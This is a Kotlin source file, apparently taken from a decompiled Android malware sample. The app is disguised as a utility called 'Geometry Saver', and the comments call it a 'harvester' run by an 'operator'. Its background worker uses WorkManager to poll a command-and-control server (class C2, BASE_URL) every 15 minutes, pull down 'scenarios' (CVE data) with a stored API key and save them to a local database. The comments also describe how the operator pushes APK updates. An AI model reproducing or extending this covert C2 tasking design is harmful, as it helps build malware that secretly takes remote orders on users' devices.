// orig: xyz/happify/ckemv/SyncWorker.java
//   kept-name (WorkManager dispatches by FQN)
//
// Belt-and-suspenders background job. If the foreground activity dies,
// WorkManager still pulls fresh scenarios from /me every 15 minutes.
//
// Does NOT do self-update — only the active-activity loop (ConfigUpdateLoop)
// checks for a newer version. If the operator releases a new APK while the
// harvester is backgrounded, the device picks it up when the user re-opens
// "Geometry Saver".

package xyz.happify.ckemv

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import xyz.happify.ckemv.db.HarvestDatabaseHelper
import xyz.happify.ckemv.jni.Reporter
import xyz.happify.ckemv.model.MeResponse
import xyz.happify.ckemv.net.C2

class SyncWorker(appContext: Context, params: WorkerParameters) :
    CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result {
        val db     = HarvestDatabaseHelper(applicationContext)
        val apiKey = db.getApiKey() ?: return Result.failure()

        val raw = Reporter.fetchCves(apiKey, C2.BASE_URL)
        if ("Error" in raw) return Result.failure()

        return try {
            val me   = Gson().fromJson(raw, MeResponse::class.java)
            val cves = me?.cves
            if (cves != null) {
                db.replaceAllCves(cves)
                Result.success()
            } else {
                Result.failure()
            }
        } catch (_: Exception) {
            Result.failure()
        }
    }
}
